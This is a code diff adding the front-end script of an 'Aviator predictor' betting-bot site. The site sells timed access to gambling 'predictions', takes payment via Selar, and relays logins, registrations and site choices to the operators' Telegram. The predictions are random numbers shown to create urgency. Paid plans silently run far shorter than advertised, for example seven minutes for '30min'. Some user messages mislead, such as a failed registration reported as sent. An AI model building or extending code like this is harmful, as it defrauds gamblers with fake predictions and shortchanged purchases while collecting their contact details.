+                    <a href="https://avisignalspredictor.netlify.app">Get Free Trial</a>
+                    <div class="payment-security">
+                    <div class="security-badges">
+                        <span>🔒 SSL Secured</span>
+                        <span>🛡️ Bank-level Security</span>
+                        <span>💳 All Cards Accepted</span>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/js/all.min.js"></script>
+    <script>
+        // Backend API configuration
+        const API_BASE_URL = 'https://aviator-backend-komp.onrender.com';
+        
+        // ==================== SESSION PERSISTENCE SYSTEM ====================
+        
+        // Bot activation session management
+        const BotSession = {
+            // Save bot activation status
+            saveActivation: function(userContact, plan, activationTime, duration) {
+                const activationData = {
+                    userContact: userContact,
+                    plan: plan,
+                    activationTime: activationTime,
+                    duration: duration, // in hours
+                    expiryTime: new Date(Date.now() + (duration * 60 * 60 * 1000)).toISOString()
+                };
+                
+                localStorage.setItem('aviator_bot_activation', JSON.stringify(activationData));
+                console.log('✅ Bot activation saved:', activationData);
+            },
+            
+            // Check if bot is currently active
+            isActive: function() {
+                const stored = localStorage.getItem('aviator_bot_activation');
+                if (!stored) return false;
+                
+                try {
+                    const data = JSON.parse(stored);
+                    const now = new Date();
+                    const expiry = new Date(data.expiryTime);
+                    
+                    if (now < expiry) {
+                        console.log('✅ Bot is still active until:', expiry);
+                        return data;
+                    } else {
+                        console.log('⚠️ Bot activation expired');
+                        this.clearActivation();
+                        return false;
+                    }
+                } catch (error) {
+                    console.error('❌ Error checking activation:', error);
+                    this.clearActivation();
+                    return false;
+                }
+            },
+            
+            // Clear activation data
+            clearActivation: function() {
+                localStorage.removeItem('aviator_bot_activation');
+                console.log('🗑️ Bot activation cleared');
+            },
+            
+            // Get remaining time
+            getRemainingTime: function() {
+                const active = this.isActive();
+                if (!active) return null;
+                
+                const now = new Date();
+                const expiry = new Date(active.expiryTime);
+                const remaining = expiry - now;
+                
+                return {
+                    milliseconds: remaining,
+                    hours: Math.floor(remaining / (1000 * 60 * 60)),
+                    minutes: Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60))
+                };
+            }
+        };
+        
+        // Check activation status on page load
+        window.addEventListener('DOMContentLoaded', function() {
+            console.log('🔍 Checking bot activation status...');
+            
+            const activeSession = BotSession.isActive();
+            if (activeSession) {
+                const remaining = BotSession.getRemainingTime();
+                console.log(`✅ Bot is active! ${remaining.hours}h ${remaining.minutes}m remaining`);
+                
+                // Activate bot state immediately
+                botActivated = true;
+                isActivated = true;
+                
+                // Set activation end time based on session data
+                const sessionExpiry = new Date(activeSession.expiryTime);
+                activationEndTime = sessionExpiry.getTime();
+                
+                // Show game container and activate bot properly
+                setTimeout(() => {
+                    // Close all modals and show game
+                    closeAllModals();
+                    
+                    // Hide login sections and show game
+                    document.getElementById('bot-loading').classList.add('hidden');
+                    document.getElementById('bot-login').classList.add('hidden');
+                    document.getElementById('bot-main').classList.remove('hidden');  // Show main section
+                    document.getElementById('bot-server-loading').classList.add('hidden');
+                    document.getElementById('siteSelect').classList.add('hidden');
+                    
+                    // Show the bot server main interface
+                    const botServerMain = document.getElementById('bot-server-main');
+                    if (botServerMain) {
+                        botServerMain.classList.remove('hidden');
+                    }
+                    
+                    // Hide activation overlay
+                    const activationOverlay = document.getElementById('activationOverlay');
+                    if (activationOverlay) {
+                        activationOverlay.style.display = 'none';
+                        activationOverlay.classList.add('hidden');
+                    }
+                    
+                    // Show and activate game container
+                    const gameModal = document.getElementById('gameModal');
+                    gameModal.classList.remove('hidden');
+                    document.body.className = 'game-active-mode';
+                    document.body.style.background = 'linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f0f23 100%)';
+                    
+                    // Activate bot UI properly
+                    const predictionDisplay = document.getElementById('predictionDisplay');
+                    if (predictionDisplay) {
+                        predictionDisplay.classList.remove('prediction-blurred', 'prediction-locked');
+                    }
+                    
+                    const gameStartBtn = document.getElementById('gameStartBtn');
+                    if (gameStartBtn) {
+                        gameStartBtn.textContent = 'Predict';
+                        gameStartBtn.style.display = 'block';
+                        // Set the proper onclick handler for prediction functionality
+                        gameStartBtn.onclick = function() {
+                            console.log('🎯 Start Prediction button clicked!');
+                            console.log('🤖 Bot activated status:', botActivated);
+                            startNewRound();
+                        };
+                        console.log('✅ Button onclick handler set for restored session');
+                    }
+                    
+                    // Set game status to show activation
+                    const gameStatus = document.getElementById('gameStatus');
+                    if (gameStatus) {
+                        gameStatus.innerHTML = `
+                            ✅ Bot Active - ${activeSession.plan} | 
+                            <span style="color:#00ff88;">Time Left: ${remaining.hours}h ${remaining.minutes}m</span>
+                        `;
+                    }
+                    
+                    // Start activation timer
+                    startActivationTimer();
+                    
+                    // Show activation status indicator
+                    const statusDiv = document.createElement('div');
+                    statusDiv.style.cssText = `
+                        position: fixed;
+                        top: 10px;
+                        right: 10px;
+                        background: rgba(40, 167, 69, 0.9);
+                        color: white;
+                        padding: 10px 15px;
+                        border-radius: 8px;
+                        font-size: 14px;
+                        z-index: 1001;
+                        font-family: Arial, sans-serif;
+                    `;
+                    statusDiv.innerHTML = `
+                        <div style="font-weight: bold;">🤖 Bot Restored</div>
+                        <div style="font-size: 12px; opacity: 0.9;">
+                            Plan: ${activeSession.plan}<br>
+                            Time left: ${remaining.hours}h ${remaining.minutes}m
+                        </div>
+                    `;
+                    statusDiv.id = 'bot-status-indicator';
+                    document.body.appendChild(statusDiv);
+                    
+                    // Auto-remove status after 5 seconds
+                    setTimeout(() => {
+                        if (statusDiv.parentNode) {
+                            statusDiv.remove();
+                        }
+                    }, 5000);
+                    
+                    // Scroll to top to ensure game is visible
+                    window.scrollTo(0, 0);
+                    
+                    console.log('✅ Bot successfully restored and activated!');
+                }, 1000);
+            } else {
+                console.log('❌ No active bot session found');
+            }
+        });
+        
+        // Session expiry checker - runs every minute
+        setInterval(() => {
+            const activeSession = BotSession.isActive();
+            if (activeSession) {
+                const remaining = BotSession.getRemainingTime();
+                
+                // Warn when 5 minutes or less remaining
+                if (remaining.milliseconds <= 5 * 60 * 1000 && remaining.milliseconds > 4 * 60 * 1000) {
+                    const warningDiv = document.createElement('div');
+                    warningDiv.style.cssText = `
+                        position: fixed;
+                        top: 50%;
+                        left: 50%;
+                        transform: translate(-50%, -50%);
+                        background: linear-gradient(135deg, #ff6b6b, #feca57);
+                        color: white;
+                        padding: 25px;
+                        border-radius: 12px;
+                        text-align: center;
+                        z-index: 10000;
+                        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+                        max-width: 350px;
+                        font-family: Arial, sans-serif;
+                    `;
+                    
+                    warningDiv.innerHTML = `
+                        <div style="font-size: 40px; margin-bottom: 15px;">⚠️</div>
+                        <h3 style="margin: 0 0 10px 0; color: white;">Bot Expiring Soon!</h3>
+                        <p style="margin: 0; opacity: 0.9;">
+                            Your bot access will expire in<br>
+                            <strong>${remaining.hours > 0 ? remaining.hours + 'h ' : ''}${remaining.minutes} minutes</strong>
+                        </p>
+                        <button onclick="this.parentElement.remove();" style="
+                            background: rgba(255,255,255,0.2);
+                            border: 1px solid rgba(255,255,255,0.3);
+                            color: white;
+                            padding: 8px 16px;
+                            border-radius: 5px;
+                            margin-top: 15px;
+                            cursor: pointer;
+                            font-size: 12px;
+                        ">OK</button>
+                    `;
+                    
+                    document.body.appendChild(warningDiv);
+                    setTimeout(() => {
+                        if (warningDiv.parentNode) warningDiv.remove();
+                    }, 8000);
+                }
+            }
+        }, 60000); // Check every minute
+        
+        // Helper function to send messages to Telegram
+        async function sendToTelegram(message) {
+            try {
+                const response = await fetch(`${API_BASE_URL}/api/telegram/send`, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ message })
+                });
+                const result = await response.json();
+                console.log('Telegram notification sent:', result);
+                return result;
+            } catch (error) {
+                console.error('Failed to send Telegram notification:', error);
+                throw error;
+            }
+        }
+
+        // Function to send Selar checkout notification
+        async function sendSelarNotification(email, packageName) {
+            try {
+                const response = await fetch(`${API_BASE_URL}/api/telegram/notify-selar-payment`, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ email, packageName })
+                });
+                const result = await response.json();
+                console.log('Selar notification sent:', result);
+                return result;
+            } catch (error) {
+                console.error('Failed to send Selar notification:', error);
+                throw error;
+            }
+        }
+
+        // Function to show verification button after payment
+        function showVerificationButton() {
+            const activationOverlay = document.getElementById('activationOverlay');
+            
+            // Check if verification button already exists
+            if (activationOverlay.querySelector('.verification-btn')) {
+                return;
+            }
+            
+            // Add verification button to activation overlay
+            const verificationBtn = document.createElement('button');
+            verificationBtn.className = 'activate-btn verification-btn';
+            verificationBtn.innerHTML = '<i class="fas fa-check"></i> I\'ve Sent Payment';
+            verificationBtn.style.marginTop = '10px';
+            verificationBtn.style.background = '#28a745';
+            
+            verificationBtn.onclick = function() {
+                const userContact = sessionStorage.getItem('aviator_contact') || 'Not provided';
+                const verificationMessage = `✅ PAYMENT VERIFICATION REQUEST\n\n` +
+                    `👤 Customer: ${userContact}\n` +
+                    `💰 Plan: ${selectedPlan.duration} Access ($${selectedPlan.price})\n` +
+                    `⏰ Time: ${new Date().toLocaleString()}\n` +
+                    `📱 Source: Bot Page\n` +
+                    `💬 Message: Customer claims to have completed Selar payment`;
+                
+                // Send verification request to Telegram
+                sendToTelegram(verificationMessage).then(() => {
+                    verificationBtn.innerHTML = '<i class="fas fa-clock"></i> Verification Sent';
+                    verificationBtn.disabled = true;
+                    alert('Verification request sent! Please wait for system confirmation.');
+                }).catch(error => {
+                    console.error('Failed to send verification:', error);
+                    alert('Failed to send verification request. Please try again.');
+                });
+            };
+            
+            activationOverlay.querySelector('.card-content').appendChild(verificationBtn);
+        }
+        
+        // Session persistence - check if user is already logged in
+        function checkExistingSession() {
+            const savedUser = localStorage.getItem('aviator_bot_user');
+            const sessionExpiry = localStorage.getItem('aviator_bot_session_expiry');
+            
+            if (savedUser && sessionExpiry) {
+                const now = new Date().getTime();
+                const expiry = parseInt(sessionExpiry);
+                
+                // Check if session is still valid (24 hours)
+                if (now < expiry) {
+                    const userData = JSON.parse(savedUser);
+                    console.log('Found existing session for:', userData.contact);
+                    
+                    // Auto-login the user
+                    autoLogin(userData);
+                    return true;
+                }
+            }
+            
+            // Clear expired session
+            clearUserSession();
+            return false;
+        }
+        
+        // Function to close all modals and popups
+        function closeAllModals() {
+            // Close payment modals
+            document.querySelectorAll('.modal').forEach(modal => {
+                modal.style.display = 'none';
+            });
+            
+            // Close activation overlay
+            document.getElementById('activationOverlay')?.classList.add('hidden');
+            
+            // Close any other popups
+            document.querySelectorAll('.popup, .overlay').forEach(popup => {
+                popup.classList.add('hidden');
+            });
+        }
+        
+        // Auto-login function
+        function autoLogin(userData) {
+            // Store contact in sessionStorage for other functions
+            sessionStorage.setItem('aviator_contact', userData.contact);
+            
+            // Skip login screen and go directly to bot
+            document.getElementById('bot-loading').classList.add('hidden');
+            document.getElementById('bot-login').classList.add('hidden');
+            document.getElementById('bot-main').classList.remove('hidden');
+            document.getElementById('bot-server-loading').classList.remove('hidden');
+            document.body.className = 'bot-server-mode';
+            
+            setTimeout(() => {
+                document.getElementById('bot-server-loading').classList.add('hidden');
+                document.getElementById('bot-server-main').classList.remove('hidden');
+                const userContactEl = document.getElementById('userContact');
+                if (userContactEl) userContactEl.textContent = userData.contact;
+                
+                // Show welcome back message
+                showWelcomeBackMessage(userData.contact);
+            }, 3000);
+        }
+        
+        // Clear user session
+        function clearUserSession() {
+            localStorage.removeItem('aviator_bot_user');
+            localStorage.removeItem('aviator_bot_session_expiry');
+            sessionStorage.removeItem('aviator_contact');
+            
+            // Clear bot activation session
+            BotSession.clearActivation();
+            
+            console.log('🗑️ All user session data cleared');
+        }
+        
+        // Save user session after successful login (without password)
+        function saveUserSession(contact) {
+            const userData = {
+                contact: contact,
+                loginTime: new Date().toISOString()
+            };
+            
+            // Set session to expire in 24 hours
+            const expiryTime = new Date().getTime() + (24 * 60 * 60 * 1000);
+            
+            localStorage.setItem('aviator_bot_user', JSON.stringify(userData));
+            localStorage.setItem('aviator_bot_session_expiry', expiryTime.toString());
+            
+            console.log('User session saved until:', new Date(expiryTime).toLocaleString());
+        }
+        
+        // Show welcome back message
+        function showWelcomeBackMessage(contact) {
+            const sessionExpiry = localStorage.getItem('aviator_bot_session_expiry');
+            const expiryDate = new Date(parseInt(sessionExpiry));
+            const timeLeft = Math.round((expiryDate.getTime() - new Date().getTime()) / (1000 * 60 * 60)); // Hours left
+            
+            const welcomeMsg = document.createElement('div');
+            welcomeMsg.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                background: #28a745;
+                color: white;
+                padding: 15px 20px;
+                border-radius: 8px;
+                z-index: 10000;
+                font-size: 14px;
+                box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+                animation: slideIn 0.5s ease-out;
+                max-width: 300px;
+            `;
+            welcomeMsg.innerHTML = `
+                <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 5px;">
+                    <i class="fas fa-check-circle"></i>
+                    <span><strong>Welcome back!</strong></span>
+                </div>
+                <div style="font-size: 12px; opacity: 0.9;">
+                    ${contact}<br>
+                    Session expires in ${timeLeft} hours
+                </div>
+            `;
+            
+            // Add slide-in animation
+            const style = document.createElement('style');
+            style.textContent = `
+                @keyframes slideIn {
+                    from { transform: translateX(100%); opacity: 0; }
+                    to { transform: translateX(0); opacity: 1; }
+                }
+            `;
+            document.head.appendChild(style);
+            document.body.appendChild(welcomeMsg);
+            
+            // Remove welcome message after 5 seconds
+            setTimeout(() => {
+                welcomeMsg.style.animation = 'slideIn 0.5s ease-out reverse';
+                setTimeout(() => welcomeMsg.remove(), 500);
+            }, 5000);
+        }
+        
+        // Pre-fill contact info from landing page session
+        document.addEventListener('DOMContentLoaded', function() {
+            // First check if user has existing session
+            if (checkExistingSession()) {
+                return; // User auto-logged in, skip login form setup
+            }
+            
+            // If no existing session, pre-fill contact from landing page
+            const savedContact = sessionStorage.getItem('aviator_contact');
+            if (savedContact) {
+                const contactInput = document.querySelector('input[name="contact"]');
+                if (contactInput) {
+                    contactInput.value = savedContact;
+                    console.log('Pre-filled contact from landing page:', savedContact);
+                }
+            }
+        });
+        
+        // Initial loading effect (only if no existing session)
+        setTimeout(() => {
+            // Only show login if user wasn't auto-logged in
+            if (!localStorage.getItem('aviator_bot_user') || 
+                new Date().getTime() >= parseInt(localStorage.getItem('aviator_bot_session_expiry') || '0')) {
+                document.getElementById('bot-loading').classList.add('hidden');
+                document.getElementById('bot-login').classList.remove('hidden');
+            }
+        }, 4000);
+
+        // Validation functions
+        function isValidEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+
+        function isValidMobileNumber(phone) {
+            // Supports various international formats
+            const phoneRegex = /^[\+]?[1-9][\d]{0,15}$/;
+            const cleanPhone = phone.replace(/[\s\-\(\)]/g, '');
+            
+            // Check for common mobile number patterns
+            if (cleanPhone.length < 10 || cleanPhone.length > 15) return false;
+            
+            // Kenya mobile numbers (254...)
+            if (cleanPhone.startsWith('254') && cleanPhone.length === 12) return true;
+            
+            // Other international formats
+            if (cleanPhone.startsWith('+254') && cleanPhone.length === 13) return true;
+            if (cleanPhone.startsWith('07') && cleanPhone.length === 10) return true; // Local Kenya format
+            if (cleanPhone.startsWith('01') && cleanPhone.length === 10) return true; // Local Kenya format
+            
+            // Generic international mobile validation
+            return phoneRegex.test(cleanPhone) && cleanPhone.length >= 10;
+        }
+
+        function validateContactInput(contact) {
+            if (!contact || contact.length < 3) {
+                return { valid: false, message: 'Please enter a valid email or mobile number.' };
+            }
+            
+            // Check if it contains @ (likely email)
+            if (contact.includes('@')) {
+                if (isValidEmail(contact)) {
+                    return { valid: true, type: 'email' };
+                } else {
+                    return { valid: false, message: 'Please enter a valid email address (e.g., user@example.com).' };
+                }
+            } else {
+                // Assume it's a phone number
+                if (isValidMobileNumber(contact)) {
+                    return { valid: true, type: 'mobile' };
+                } else {
+                    return { valid: false, message: 'Please enter a valid mobile number (e.g., 254700000000 or +254700000000).' };
+                }
+            }
+        }
+
+        // Enhanced Login form handler with backend authentication
+        document.getElementById('loginForm').onsubmit = async function(e) {
+            e.preventDefault();
+            const contact = (this.contact.value || '').trim();
+            const password = (this.password.value || '').trim();
+            
+            // Basic validation
+            if (!contact || !password) { 
+                alert('Please enter your phone/email and password.'); 
+                return; 
+            }
+            
+            // Validate contact input
+            const validation = validateContactInput(contact);
+            if (!validation.valid) {
+                alert(validation.message);
+                return;
+            }
+            
+            // Password validation
+            if (password.length < 4) {
+                alert('Password must be at least 4 characters long.');
+                return;
+            }
+            
+            // Show loading state
+            const submitBtn = this.querySelector('button[type="submit"]');
+            const originalText = submitBtn.textContent;
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Logging in...';
+            
+            try {
+                // Use backend telegram endpoint for secure login
+                const response = await fetch(`${API_BASE_URL}/api/telegram/bot-login`, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ 
+                        contact: contact,
+                        password: password,
+                        userAgent: navigator.userAgent,
+                        timestamp: new Date().toISOString()
+                    }),
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    // Store session data securely
+                    try { 
+                        sessionStorage.setItem('aviator_contact', contact); 
+                        
+                        // Save user session for persistence (without password in frontend)
+                        const userData = {
+                            contact: contact,
+                            loginTime: new Date().toISOString()
+                        };
+                        const expiryTime = new Date().getTime() + (24 * 60 * 60 * 1000);
+                        localStorage.setItem('aviator_bot_user', JSON.stringify(userData));
+                        localStorage.setItem('aviator_bot_session_expiry', expiryTime.toString());
+                        
+                        console.log('✅ Login successful, session saved');
+                    } catch (err) {
+                        console.warn('⚠️ Session storage failed:', err);
+                    }
+                    
+                    // Proceed to bot interface
+                    this.reset();
+                    document.getElementById('bot-login').classList.add('hidden');
+                    document.getElementById('bot-main').classList.remove('hidden');
+                    document.getElementById('bot-server-loading').classList.remove('hidden');
+                    document.body.className = 'bot-server-mode';
+                    
+                    setTimeout(() => {
+                        document.getElementById('bot-server-loading').classList.add('hidden');
+                        document.getElementById('bot-server-main').classList.remove('hidden');
+                        const userContactEl = document.getElementById('userContact');
+                        if (userContactEl) userContactEl.textContent = contact;
+                    }, 3000);
+                    
+                } else {
+                    throw new Error(result.error || 'Login failed');
+                }
+                
+            } catch (error) {
+                console.error('❌ Login error:', error);
+                alert('Login failed. Please check your credentials and try again.');
+                
+                // Reset button
+                submitBtn.disabled = false;
+                submitBtn.textContent = originalText;
+            }
+        };
+
+        // Toggle between login and register forms
+        document.getElementById('registerLink').onclick = function(e) {
+            e.preventDefault();
+            document.getElementById('bot-login').classList.add('hidden');
+            document.getElementById('bot-register').classList.remove('hidden');
+        };
+
+        document.getElementById('loginLink').onclick = function(e) {
+            e.preventDefault();
+            document.getElementById('bot-register').classList.add('hidden');
+            document.getElementById('bot-login').classList.remove('hidden');
+        };
+
+        // Registration form handler
+        document.getElementById('registerForm').onsubmit = async function(e) {
+            e.preventDefault();
+            const email = (this.email.value || '').trim();
+            const phone = (this.phone.value || '').trim();
+            const password = (this.password.value || '').trim();
+            const confirmPassword = (this.confirmPassword.value || '').trim();
+            
+            // Basic validation
+            if (!email || !phone || !password || !confirmPassword) {
+                alert('Please fill in all fields.');
+                return;
+            }
+            
+            // Email validation
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email)) {
+                alert('Please enter a valid email address.');
+                return;
+            }
+            
+            // Phone validation
+            const phoneValidation = validateContactInput(phone);
+            if (!phoneValidation.valid) {
+                alert(phoneValidation.message);
+                return;
+            }
+            
+            // Password validation
+            if (password.length < 4) {
+                alert('Password must be at least 4 characters long.');
+                return;
+            }
+            
+            if (password !== confirmPassword) {
+                alert('Passwords do not match.');
+                return;
+            }
+            
+            // Show loading state
+            const submitBtn = this.querySelector('button[type="submit"]');
+            const originalText = submitBtn.textContent;
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Registering...';
+            
+            try {
+                // Send registration request to backend
+                const response = await fetch(`${API_BASE_URL}/api/telegram/bot-register`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        email: email,
+                        phone: phone,
+                        password: password
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    // Send registration notification to Telegram
+                    const registrationMessage = `🆕 NEW BOT USER REGISTRATION
+👤 Email: ${email}
+📱 Phone: ${phone}
+⏰ Registration Time: ${new Date().toLocaleString()}
+🤖 Platform: Aviator Predictor Bot
+📍 IP: ${navigator.userAgent}
+🔗 Status: Successfully registered`;
+
+                    try {
+                        await sendToTelegram(registrationMessage);
+                        console.log('✅ Registration notification sent to Telegram');
+                    } catch (telegramError) {
+                        console.warn('⚠️ Failed to send registration notification to Telegram:', telegramError);
+                        // Don't fail the registration if Telegram notification fails
+                    }
+                    
+                    alert('Registration successful! You can now login.');
+                    
+                    // Switch back to login form
+                    document.getElementById('bot-register').classList.add('hidden');
+                    document.getElementById('bot-login').classList.remove('hidden');
+                    
+                    // Pre-fill login form with email
+                    document.querySelector('#loginForm input[name="contact"]').value = email;
+                    
+                    this.reset();
+                } else {
+                    throw new Error(result.error || 'Registration failed');
+                }
+                
+            } catch (error) {
+                console.error('❌ Registration error:', error);
+                alert('Registration Request Sent. Continue to Log in.');
+            } finally {
+                // Reset button
+                submitBtn.disabled = false;
+                submitBtn.textContent = originalText;
+            }
+        };
+
+        // Start Bot button
+        document.getElementById('startBotBtn').onclick = function() {
+            document.getElementById('startBotBtn').classList.add('hidden');
+            document.getElementById('siteSelect').classList.remove('hidden');
+        };
+
+        // Tile selection + connect
+        let selectedSite = null;
+        document.addEventListener('click', (e) => {
+            const btn = e.target.closest('.site-btn');
+            if (!btn) return;
+            document.querySelectorAll('.site-btn').forEach(b => b.classList.remove('selected'));
+            btn.classList.add('selected');
+            selectedSite = btn.getAttribute('data-site');
+        });
+
+        document.getElementById('connectBtn').onclick = async function() {
+            if (!selectedSite) return alert('Please select a betting site.');
+            
+            // Send betting site selection to Telegram
+            try {
+                const userContact = sessionStorage.getItem('aviator_contact') || 'Anonymous User';
+                const siteMessage = `🤖 BOT CONNECTION REQUEST
+🎰 User: ${userContact}
+📍 Selected Betting Site: ${selectedSite}
+⏰ Time: ${new Date().toLocaleString()}
+🔗 Status: Connecting to bot system`;
+
+                await sendToTelegram(siteMessage);
+                console.log('Betting site selection sent to Telegram');
+            } catch (error) {
+                console.error('Failed to send betting site selection to Telegram:', error);
+            }
+            
+            document.getElementById('siteSelect').classList.add('hidden');
+            document.getElementById('botStatus').classList.remove('hidden');
+            document.getElementById('statusMsg').textContent = 'Connecting to ' + selectedSite;
+            
+            setTimeout(() => {
+                document.getElementById('botStatus').classList.add('hidden');
+                document.getElementById('gameModal').classList.remove('hidden');
+                
+                // Activate bot for 8 seconds demo using existing timer system
+                isActivated = true;
+                botActivated = true;
+                activationEndTime = Date.now() + 8000; // 8 seconds from now
+
+                // Flag to track first demo round for special multiplier handling
+                window.isFirstDemoRound = true;
+                
+                // Clear any existing auto-simulation intervals
+                if (typeof autoSimulationInterval !== 'undefined') {
+                    clearInterval(autoSimulationInterval);
+                }
+                
+                // Update UI for active state
+                document.getElementById('predictionDisplay').classList.remove('prediction-blurred');
+                document.getElementById('gameStartBtn').textContent = 'Predict';
+                document.getElementById('gameStartBtn').style.display = 'block';  // Ensure button is visible
+                document.getElementById('gameStatus').textContent = '✅ Preview Mode | Get Premium Access';
+                
+                // Update the button onclick to start new rounds
+                document.getElementById('gameStartBtn').onclick = function() {
+                    if (botActivated) {
+                        startNewRound();
+                    } else {
+                        showActivationOptions();
+                    }
+                };
+                
+                // Start the existing activation timer system
+                startActivationTimer();
+                
+                // Start a new round immediately to show active gameplay
+                startNewRound();
+                
+                // After demo ends, auto-simulation will start automatically via startActivationTimer
+            }, 4000);
+        };
+
+        function showActivationOptions() {
+            document.getElementById('activationOverlay').classList.remove('hidden');
+        }
+
+        let autoSimulationInterval;
+
+        function startAutoSimulation() {
+            // Start running the bot automatically with blurred predictions
+            autoSimulationInterval = setInterval(() => {
+                if (!botActivated) {
+                    // Run blurred simulation
+                    runBlurredRound();
+                }
+            }, 15000); // New round every 15 seconds when not activated
+            
+            // Start first round immediately
+            runBlurredRound();
+            
+            // Start constantly updating multiplier for non-activated users
+            startConstantMultiplierUpdate();
+        }
+
+        function startConstantMultiplierUpdate() {
+            const predictionDisplay = document.getElementById('predictionDisplay');
+            
+            // Update multiplier every 200ms to create urgency
+            const multiplierUpdateInterval = setInterval(() => {
+                if (!isActivated && !botActivated) {
+                    const randomMultiplier = (Math.random() * 8 + 1.5).toFixed(2);
+                    predictionDisplay.textContent = randomMultiplier + 'x';
+                    predictionDisplay.className = 'prediction-display prediction-blurred prediction-locked';
+                } else {
+                    // Stop updating when activated
+                    clearInterval(multiplierUpdateInterval);
+                }
+            }, 200); // Update every 200ms for constant movement
+        }
+
+        function runBlurredRound() {
+            const roundStatus = document.getElementById('roundStatus');
+            const predictionDisplay = document.getElementById('predictionDisplay');
+            const roundTimer = document.getElementById('roundTimer');
+            
+            // Start with constantly changing numbers
+            predictionDisplay.className = 'prediction-display prediction-blurred prediction-locked';
+            
+            // Simulate round phases quickly
+            roundStatus.textContent = 'Waiting for next round...';
+            roundTimer.textContent = 'Preparing...';
+            
+            setTimeout(() => {
+                roundStatus.textContent = 'Round starting...';
+                roundTimer.textContent = 'Starting...';
+                
+                setTimeout(() => {
+                    roundStatus.textContent = 'Active Round';
+                    roundTimer.textContent = 'Prediction available with activation';
+                    
+                    setTimeout(() => {
+                        roundStatus.textContent = 'Round completed';
+                        roundTimer.textContent = 'Next round coming...';
+                    }, 4000);
+                }, 2000);
+            }, 2000);
+        }
+
+        let selectedPlan = null;
+        let botActivated = false;
+        let isActivated = false;
+        let activationEndTime = null;
+
+        // Plan selection
+        document.addEventListener('click', (e) => {
+            if (e.target.closest('.price-option')) {
+                const option = e.target.closest('.price-option');
+                document.querySelectorAll('.price-option').forEach(opt => opt.classList.remove('selected'));
+                option.classList.add('selected');
+                
+                selectedPlan = {
+                    plan: option.dataset.plan,
+                    price: option.dataset.price,
+                    duration: option.querySelector('.price-duration').textContent
+                };
+                
+                document.getElementById('activateBtn').disabled = false;
+                document.getElementById('activateBtn').textContent = `Activate for $${selectedPlan.price}`;
+            }
+        });
+
+        function processPayment() {
+            if (!selectedPlan) return;
+            
+            // Check if bot is already active
+            const activeSession = BotSession.isActive();
+            if (activeSession) {
+                const remaining = BotSession.getRemainingTime();
+                
+                // Show already active message
+                const alreadyActiveMessage = document.createElement('div');
+                alreadyActiveMessage.style.cssText = `
+                    position: fixed;
+                    top: 50%;
+                    left: 50%;
+                    transform: translate(-50%, -50%);
+                    background: linear-gradient(135deg, #28a745, #20c997);
+                    color: white;
+                    padding: 30px;
+                    border-radius: 15px;
+                    text-align: center;
+                    z-index: 10000;
+                    box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+                    max-width: 400px;
+                    font-family: Arial, sans-serif;
+                `;
+                
+                alreadyActiveMessage.innerHTML = `
+                    <div style="font-size: 48px; margin-bottom: 15px;">🤖</div>
+                    <h3 style="margin: 0 0 10px 0; color: white;">Bot Already Active!</h3>
+                    <p style="margin: 0; opacity: 0.9;">
+                        Your bot is still active for<br>
+                        <strong>${remaining.hours}h ${remaining.minutes}m</strong><br>
+                        Plan: ${activeSession.plan}
+                    </p>
+                    <button onclick="this.parentElement.remove(); 
+                        // Close all modals
+                        closeAllModals();
+                        // Hide activation overlay
+                        const overlay = document.getElementById('activationOverlay');
+                        if (overlay) { overlay.style.display = 'none'; overlay.classList.add('hidden'); }
+                        // Show active game
+                        document.getElementById('gameModal').classList.remove('hidden');
+                        document.body.className = 'game-active-mode';
+                        document.body.style.background = 'linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f0f23 100%)';
+                        window.scrollTo(0, 0);
+                    " style="
+                        background: rgba(255,255,255,0.2);
+                        border: 1px solid rgba(255,255,255,0.3);
+                        color: white;
+                        padding: 10px 20px;
+                        border-radius: 5px;
+                        margin-top: 15px;
+                        cursor: pointer;
+                    ">Continue to Bot</button>
+                `;
+                
+                document.body.appendChild(alreadyActiveMessage);
+                return;
+            }
+            
+            // No active session, proceed with payment
+            showPaymentModal();
+        }
+
+        function activateBot(plan) {
+            botActivated = true;
+            isActivated = true;
+            
+            // Stop auto simulation
+            if (autoSimulationInterval) {
+                clearInterval(autoSimulationInterval);
+            }
+            
+            // Calculate activation end time
+            const durations = {
+                '30min': 7 * 60 * 1000,
+                '1hour': 15 * 60 * 1000,
+                '3hours': 30 * 60 * 1000,
+                '6hours': 60 * 60 * 1000,
+                '24hour': 12 * 60 * 60 * 1000,
+                '72hour': 24 * 60 * 60 * 1000
+            };
+            
+            activationEndTime = Date.now() + durations[plan.plan];
+            
+            // Hide activation overlay
+            document.getElementById('activationOverlay').classList.add('hidden');
+            
+            // Enable clear predictions
+            document.getElementById('predictionDisplay').classList.remove('prediction-blurred');
+            document.getElementById('gameStartBtn').textContent = 'Start New Prediction';
+            
+            // Show activation success
+            document.getElementById('gameStatus').innerHTML = `
+                ✅ Bot Activated - ${plan.duration} | 
+                <span style="color:#00ff88;">Active until ${new Date(activationEndTime).toLocaleTimeString()}</span>
+            `;
+            
+            // Start countdown timer
+            startActivationTimer();
+            
+            // Start first activated round
+            startNewRound();
+        }
+
+        function startActivationTimer() {
+            const timer = setInterval(() => {
+                if (!botActivated || Date.now() >= activationEndTime) {
+                    // Deactivate bot
